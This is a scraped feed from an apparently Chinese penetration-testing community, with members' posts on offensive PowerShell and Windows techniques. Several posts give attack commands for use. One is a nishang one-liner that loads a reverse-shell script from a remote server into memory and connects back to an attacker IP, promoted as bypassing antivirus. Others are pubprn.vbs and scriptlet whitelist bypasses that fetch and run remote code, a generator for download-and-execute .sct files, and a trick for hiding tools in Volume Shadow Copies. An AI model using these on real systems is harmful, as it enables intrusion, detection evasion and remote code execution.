昨天我带团队通读了一遍，对于团队来说两块很明显的收益：英文能力提升、PowerShell 攻防姿势提升。

PowerShell 已经成为玩渗透必备技能，如果你还没掌握，赶快入坑。😏


__分享文件:__
[increased-use-of-powershell-in-attacks-16-en.pdf](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/increased-use-of-powershell-in-attacks-16-en.pdf)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年开始，(null)   就一直喊我学 PowerShell，只要和我见面必然会 Show 他的成果，还给我分享了各种环境、工具及学习笔记。可我当时并不以为然啊，Python 与 JavaScript 是我最好的武器，在我的工作场景下基本通杀全栈，我觉得够了，没想到，PowerShell 已经吐火如茶成这样，果然是老司机的建议，咱都收...

<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 吐火如茶？如火如荼？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 哈，手快敲错

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 自带混淆这个不错。

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 各大杀软已经把恶意调用powershell加入黑名单了…真的厉害😂过段时间应该会有人在xx大会上分享powershell了


...

---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:

.sct generator by Moriarty@DMZLab
这是我闲着蛋疼用powershell 写的一个GUI小程序，功能主要是用来生成.sct文件。发这DD的目的主要是给大家介绍一下另一种方式来写GUI程序———Form（窗体）。用这种方式可以仅仅只需要powershell studio一个IDE就可以完成，在写一些简单的GUI的程序尤其适合。
那么程序本身的功能很简单，就是用来生成.sct文件，这个类型的文件想必好多朋友都已经了解，subtee牛已经详细阐述过了。我一般用它下载执行exe文件的时候居多，用法如下：
1.用certutil.exe(win7以上系统自带）将exe转成shellcode，格式如下：
certutil.exe -encode setup.exe setup.b64
2.将setup.b64的内容复制黏贴到中间输入框中，然后点击Generate即可生成一个随机命名的.sct文件。
3.将这个文件放到一个web server上，然后用程序中给出的一句话在目标机器上执行，即可完成exe的下载并执行。
程序中的refresh可以重新初始化所有参数（主要是重新生成一些随机的命名），clear会清空中间输入框中的内容。
如果你想生成其它功能的.sct文件，可以双击第一个文本框和第三个文本框使之变为可修改状态，就可以定制自己的sct文件了。
工具虽小，但我里面用了一些小技巧，你在阅读源码的时候应该就会注意到了。另外，写得仓促，可能有错误或者需要改进的地方，圈友们可自行修改。

<img src="https://images.xiaomiquan.com/Fvb1uk0UNtTW4QO5ztFWnIhekvWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:WCbccaAneV-SSm2aQD_ttO-v1IM=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fkr-fsE9IHqeL1mLm1clvDYlA_uF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BmcsH54WipZgXlwsaGngF9B6qh0=" width="50%" height="50%" align="middle"/>

__分享文件:__
[SctGenerator.zip](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/SctGenerator.zip)


---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:

Powershell Useful ToolSet by Moriarty@DMZLab
这是我打算把一些小的有用的工具集成的小项目，目前还没完成，之所以放上来，就是想给大家介绍一些如何写类似这样的powershell程序。目前仅写了一个简单的小功能，其它的后面继续完善。
把这未完成品放上来，是想给大家介绍一些powershell GUI程序如何去写。一种方法使用powershell studio自带的界面设计器来做，这种方法简单实用，但是也是有许多不如人意的地方（这里不再赘述）。另外一种方法是使用XAML，虽然稍微麻烦了一些，但是看上去更简洁，更通用，也是最常用的方法（尤其对那些没有powershell studio或者不喜欢用powershell studio的童鞋们）。

今天我们重点介绍后一种，其实步骤也很简单：

一、用visual studio进行界面设计（我这里用的visual studio 2017，没有这个的用express版也可以）。创建项目时选择 “WPF应用（.Net Framework）”即可。如附图一所示。

二、画界面。这个就不用多说了，所见即所得，很简单。画完后如附图二所示。

三、把图二中的XAML代码完整复制出来，然后粘贴到powershell代码中，如下所示：

```
[xml]$XAML = @'
<Window 
    x:Class="WpfApp1.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/prese...
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008...
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibi...
    xmlns:local="clr-namespace:WpfApp1"
    mc:Ignorable="d"
        Title="Powershell Useful ToolSet V0.1 By Moriarty@DMZLab" Height="350" Width="566.77" WindowStyle="ToolWindow" Background="#FFF5F1F1" Topmost="True" WindowStartupLocation="CenterScreen">
    <Grid>
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="280*"/>
            <ColumnDefinition Width="279*"/>
        </Grid.ColumnDefinitions>
        <TabControl x:Name="tabctl_1" VerticalAlignment="Top" Height="322" Grid.ColumnSpan="2">
            <TabItem x:Name="tabItem_obf" Header="Obfustcator">
                <Grid Background="#FFE5E5E5" Margin="0">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="178*"/>
                        <ColumnDefinition Width="371*"/>
                    </Grid.ColumnDefinitions>
                    <Label Grid.ColumnSpan="2" Content="Randomly obfuscate powershell command (using enviroment variable):" HorizontalAlignment="Left" Height="23" Margin="10,10,0,0" VerticalAlignment="Top" Width="529" HorizontalContentAlignment="Center" Foreground="Red"/>
                    <Button x:Name="btn_go" Content="GO" Grid.Column="1" HorizontalAlignment="Left" Height="19" Margin="31,126,0,0" VerticalAlignment="Top" Width="115"/>
                    <TextBox x:Name="textbox_output" Grid.ColumnSpan="2" HorizontalAlignment="Left" Height="85" Margin="10,36,0,0" TextWrapping="Wrap" Text="" VerticalAlignment="Top" Width="529"/>
                </Grid>
            </TabItem>
            <TabItem x:Name="tabItem_gen" Header="Generator">
                <Grid Background="#FFE5E5E5"/>
            </TabItem>
        </TabControl>

    </Grid>
</Window>

'@
```

四、添加PresentationFramework程序集的引用：

`Add-Type -Assembly PresentationFramework`

或者：

`[void][system.Reflection.Assembly]::LoadWithPartialName("PresentationFramework")`

五、需要删除几行复制过来的XAML代码，不然会有错误（你事先手动删除然后再复制过来也行，不过我还是喜欢交给代码来完成）：

```
$XAML.Window.RemoveAttribute('x:Class')
$XAML.Window.RemoveAttribute('mc:Ignorable')
$XAML.Window.RemoveAttribute('xmlns:local')
```

六、然后就是解析XAML，让你的图形界面显示出来了（事件添加很简单，可以参考完整代码，我这里不多说了）：

```
$reader = New-Object System.Xml.XmlNodeReader $XAML
try
{
  $Form = [Windows.Markup.XamlReader]::Load($reader)
}
catch
{
  Write-Host -ForegroundColor Red "Processing XAML Failed!"
  exit
}
$Form.ShowDialog() | Out-Null
```

是不是很简单？程序运行截图如附图三所示。

powerhsell图形界面开发很简单，而且可以跨平台，等程序最终完成我再放一个最终版。有兴趣的圈友，也可以在我这个代码基础上自己去完善一个出来，记得放出来共享哦


__分享文件:__
[PUTTs.zip](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/PUTTs.zip)


---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-29:

渗透技巧之隐藏自己的工具
大家在做内网渗透的时候，经常要传一些工具到目标机器上执行。有的时候传一次，执行完了就删除了，后来发现还要再用，又要再次上传，很是麻烦而且也容易造成被发现的风险。有的圈友可能会把工具放到一个很深的目录里藏起来，但是这种工具长期放在目标机器上又不安全。今天我给大家介绍一个猥琐的小技巧，可以放心的把工具放在目标机器上，而又不会被发现。
这里利用的就是VSS（Volume Shadow Copy），首先我们将工具上传到目标机器的某个目录里（比如c:\$Recycler.Bin),我这里方便测试，在c盘新建了一个目录test，并把工具传到了此目录里。然后我们创建C盘的VSS，这里我们可以利用微软的vssadmin工具（我的windows 2008里自带这个工具），如果没有这个工具我们可以利用wmi来操作：
1.创建VSS：
vssadmin create shadow /for=c:
或者
（Get-WmiObject Win32_ShadowCopy -List).Create("C:\","ClientAccessible")
这里记住返回的ShadowID（类似{eeb50055-34c9-472b-81e6-ed111742e12e}）
2.删除你上传的工具（我这里是直接把C:\test目录删除掉）
3.查看一下我们创建的VSS的DeviceObject（如果使用vssadmin创建的，返回结果里就会有）：

`gwmi Win32_ShadowCopy | select -Property DeviceObject`

返回结果为：

```
DeviceObject                                   
------------                                   
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8
```

4.将`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8`中的“？”换成“.”，就可以执行你的程序了：

```
\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\test\hunter64.exe
```

是不是很简单？这样做，实际硬盘上已经看不到hunter64.exe里，但是我们做了一个shadow copy，在这里shadow copy里，我们的程序还在，通过这种方式我们就可以随时随地执行我们的“影子”程序，从而实现隐藏我们的工具了。
等你不再需要这些工具的时候，直接删除你创建的VSS就可以了：
vssadmin Delete Shadows /shadow={eeb50055-34c9-472b-81e6-ed111742e12e} /quiet
或者

`Get-WmiObject Win32_ShadowCopy | where {$_.ID -eq '{eeb50055-34c9-472b-81e6-ed111742e12e}'} | Remove-WmiObject`

当然，使用WMI的方法我们不一定用powershell，也可以使用JScript或者VBScript，比如：

```
var Win32_ShadowCopy =GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ShadowCopy");
Win32_ShadowCopy.Create(
  "C:\\",
  "ClientAccessible"
);
```

举一反三的机会留给各位圈友了：-）

<img src="https://images.xiaomiquan.com/Fr3g-bDh6ZEsWgeuedBGC3XRbq_l?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jyHrhJEjosuVJuUmtjKlF2ifYJ8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FmT7oZ79Jbh44M3auMEbhYRfsx-s?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:psLIgsGpbh9aywxarRAauuzLBrg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvuN5GgkqCVU3yGgpSi-sakrbYqM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Cn4mcNhkPIcPKRk7lHitjUohHHQ=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrColQQRXcJjgEsM9G6YkaFzogxe?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nw9K-O-Y6Ga6UEfxIhipq9WYG7g=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fksg794N47n3RgzNFwYSbDDVA1jv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PJ_hAwIodO4J7VvaUZcAL7gfZFA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这里有份朋友写的指南也可以参考：
[pentest-wiki/How-to-use-vssadmin.md at master · ni...](https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-use-vssadmin.md)

...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-12:


__#工具#__

nishang 牛逼的powershell渗透框架
玩渗透的都在夸powershell各种bypass，各种无文件入侵。我们当然得了解下了，有多强大，谁试谁知道！

nishang是作者nikhil_mitt在渗透测试过程中，根据实战经验编写出来的，各个脚本都有很强大的实战意义。
什么下载和执行、键盘记录、屏幕监视、内网扫描、抓HASH、用Mimikatz 抓密码、各式各样的反弹、反弹meterpreter shell还有删除补丁等等强大模块。
其中键盘记录跟屏幕监控，觉得挺有意思的。
键盘记录脚本会将记录的信息用POST方式发到你设置的URL上，读取到你设置的URL下你设置的特定内容它会停止记录。
屏幕监控开启后，会在对方电脑上开启一个端口，你用web访问它这个端口就会生成对方屏幕的截图，并且会实时刷新，挺有意思。
简单演示下：

```
C:\Users\Administrator>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.190/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp) -Reverse -IPAddress 192.168.1.190 -port 8888
```

将你的利用脚本放到你的web服务器中，然后在你的webshell上直接执行上面这样的命令调用执行，直接加载进内存，所以bypass各种杀软。

还可以加载特定的exe程序进内存执行，只要没有写入磁盘动作，AV对它没任何反应。

可用插件太多了，地址在这里 
[GitHub - samratashok/nishang: Nishang - PowerShell...](https://github.com/samratashok/nishang)



另外照顾一下像我一样的小白，找了两篇不错的利用文章，小白看一遍，照着实验来一发是最好的了。
当然关于晋级的学习路线，就是想办法搞懂框架里面每个ps脚本，完全看懂，搞明白为什么这样编写，那样你不是大神都难啊！


[60字节 - 无文件渗透测试实验 - n0tr00t](https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html)

这篇实验很不错


[http://www.4hou.com/technology/5962.html](http://www.4hou.com/technology/5962.html)

这篇介绍了一些功能

<img src="https://images.xiaomiquan.com/Fm5xgpU8CtkJdA1HGdpE2Lc8iZ4o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lUnN4kveeBAKsxpdmxom6PAP-Js=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FoXVJry5A5tEbpiAolQu7NpF5Yku?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2XNEHgmrZhTpLawfaPYTimGy0kg=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 太复杂看不太懂，问一下，60字节 - 无文件渗透测试实验 搭建环境没有源码，漏洞如何利用都不清楚如何实验。

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 你会用虚拟机不？先用虚拟机搭起那个拓扑图，这步可以做到吗？然后在一台web服务器上，放上nishang的脚本，那么就可以在你拿了webshell的那台机器上执行我上面贴的那条命令，就可以执行攻击脚本了。那一条还不懂，说出来，不要怕丑，一切以弄懂知识为主。

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 在一台虚拟机上多个系统如何多个ip？是使用vpn吗

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 虚拟机可以软件模拟出多个内网，方便做实验，以vmware为例，搞明白 编辑-虚拟网络编辑器里面的配置，同一个vmnet就是在同一个网络下。有什么再不懂的百度下

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 好的谢谢


...

---


## WSH Injection


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#姿势#__

WSH 注入的一个实例：

[WSH Injection: A Case Study – Posts By SpecterOps Team Members](https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd)



这个之前我在本圈子里分享过（白名单 PubPrn.vbs 下载恶意执行），不过估计大多数人都不知道为什么，怎么用。

想知道“为什么”可以看这个实例解析。

至于怎么用，当你需要下载恶意代码动态执行时，PubPrn.vbs 的这个注入机制很棒。

<img src="https://images.xiaomiquan.com/FtKzsYYbF40V-9QvwxD8K6lzsd1j?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:f5zadn-LBMOuhri-YTWEFKMS1G4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 很强大，文中提到的《Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)》涉及的技巧也很溜，想看中文的旁友可以参考这个： 


[http://www.evil0x.com/posts/21268.html](http://www.evil0x.com/posts/21268.html)


...

---



## downloader


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

给大家分享点具体渗透姿势，比如白名单下载恶意代码的一个技巧。

OPCDE 里看到的一个技巧：

```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```


```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```



简单说下：

第一个是英文的 Win10，第二个是中文的 Win10。test.sct 里的代码会弹个计算器。pubprn.vbs 是 Win 系统自带的，被签名过的。通过这种方式，可以 bypass 一些防御。pubprn.vbs 充当 downloader 角色。

中文，我自己实测的，据其他圈友测试 Win7/XP 都 OK。

test.sct代码如下：

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
 >
</registration>

<script language="JScript">
<![CDATA[

  var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 
]]>
</script>

</scriptlet>
```


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  接上面那条 SCT 的白名单下载技巧，推上发现 @subTee  又扔出一个小技巧：

Hope your SCT detection is richer than looking for 
`<scriptlet><registration>`
Cause `<package><component>` works too 😀

代码在这：

[https://gist.github.com/subTee/7cec8af1ae9b9493731...](https://gist.github.com/subTee/7cec8af1ae9b9493731b8ec70e2cf034)



拷贝过来如下：

```
<?xml version="1.0"?>
<package>
  <comment>
    
  </comment>

  <component id="ABAPTest">
    <?component error="true" debug="true"?>

    <registration 
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

    <script >
        <![CDATA[

            var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 

        ]]>
    </script>
</registration>

  </component>
</package>
```

也真只有吃透 Win，才能 hack 出更多独特玩法啊。


---


## Windows COM

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  CVE-2017-0213 Windows COM 特权提升漏洞组件，实战测试 WIN10 1703 完美通过，下载地址：


[Exploits/CVE-2017-0213 at master · WindowsExploits...](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)



演示视频：


[CVE-2017-0213-hackone的秒拍](http://m.miaopai.com/show/channel/dciBNvvRVHMhThOIlaqG9qogVpApkSJ3)



来自本圈@h4ck0ne  的实测及演示视频录制，提权神洞，推荐给大家。



...

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 如果目标是域内的一台server，通过这个在本地把域账号添加到管理员组也适用么？

<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 不行


...

---


## Exchange

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:

> 匿名用户 提问：
内网中域控权限 Exchange服务器可控 如何在命令行获取所有邮箱列表及单个邮箱邮件打包 或按时间段打包


好吧，还是公开回复吧，你可以参考这个项目：


[GitHub - sensepost/ruler: A tool to abuse Exchange services](https://github.com/sensepost/ruler)



"Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely."

通过 MAPI/HTTP 与 RPC/HTTP 协议。



...

<img src="https://file.xiaomiquan.com/89/da/89dac2fbbada82afb3c1152dd4f88d703c91d5f5cbd238debe3f749b98c36f68.jpg" width="25px"/> __Twi1ight__: 用powershell在exchange服务器上也可以直接导出pst文件，支持按时间段导出，这是官方自带的


...

---


## 边界设备安全



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:

> 匿名用户 提问：
你好，能不能分享一些关于边界设备安全的资料，例如路由器，防火墙这类设备的安全，以及如何基于这类设备进行渗透测试，谢谢


之前分享的知道创宇研发技能表里有列不少。渗透测试高姿势可以参考 NSA 方程式被泄露的那批防火墙 Exploits。



---



## 信息收集



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-28:


__#基础#__

面向基础篇之信息收集

分享来自@yudan  

概要：渗透测试的第一步为信息收集。信息收集分为两个方面，主动信息收集和被动信息收集，这次我们先讲被动信息收集

被动信息收集要注意一下几点：

1. 信息是公开渠道可获得的信息，例如网络上的信息，街边的小广告

2. 收集信息时不与系统产生直接交互（例如不对主机进行大量探测，不进行端口扫描）

3. 尽量避免留下一切痕迹

可收集的信息内容有：

+ ip地址段
+ 域名信息
+ 邮件地址
+ 文档图片
+ 公司地址
+ 公司组织架构
+ 联系电话
+ 人员姓名/职务
+ 目标系统的技术架构
+ 公开的商业信息

用途有：

+ 信息描述目标
+ 社会工程学等

接下来介绍一款获得ip地址的工具：nslookup(域名查询工具)。

在用nslookup之前，我们首先需要知道域名有哪些:

域名记录:

+ A（Adress）用来指定主机名（或域名）的对应的ip地址记录
+ C name：通常称别名指向，可以将注册的不同域名统统转到一个主域名上，CNAME别名记录与A记录不同的是可以是一个域名的描述而不一定是ip地址    
+ NS：（Name Server）是域名服务器记录，用来指定域名应该由哪个DNS服务器来进行解析
+ MX：邮件交换记录，他指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器
+ ptr（ip地址反向解析）：邮件交换记录
+ TXT记录：一般为某个主机名或域名设置的说明
+ URL:网址转发
+ FQDN：完全限定域名，与域名不同（eg:www.sina.com就是一个完全限定域名，只是域名的其中一种）

dns查询方式：递归查询（相关资料可以自己查，太啰嗦不赘述）

接下来是nslookup的使用方法：

1. 我们可以直接在命令行上输入nslookup，进入命令行提示符进行操作
    + 通过 server +ip地址（中间一定要有一个空格）选择你要的本地dns服务器
    + 通过 set type=a/ns/ptr/any(代表所有记录)
    + 接下来看图，图中是百度的示例。
2. 同样的，我们可以将第一种方法上的所有参数用一条命令写出来
```
nslookup -type=a baidu.com 114.114.114.114(指定你想用的本地dns服务器)
```

P.S.

一个域名可以解析成多个主机记录和多个cname，对应多个ip地址，对一个ip地址进行ptr查询的时候不一定返回一个相同的域名
    
使用不同的服务器解析相同的域名会有不同的ip地址，因为智能dns服务器会尽量将流量限定在本地网络，当进行域名查询的时候会返回最近的域名服务器的地址

<img src="https://images.xiaomiquan.com/FoXOKm9XO81g-qTG-L7YB3R4juZi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:VdpLft4Myzk6c2JKw6hUfBYmvak=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fkn83Kq9msBwJrn804arEKfpaYQN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-I0LRfQgpTajMTtXydf-mD0kxnQ=" width="50%" height="50%" align="middle"/>


---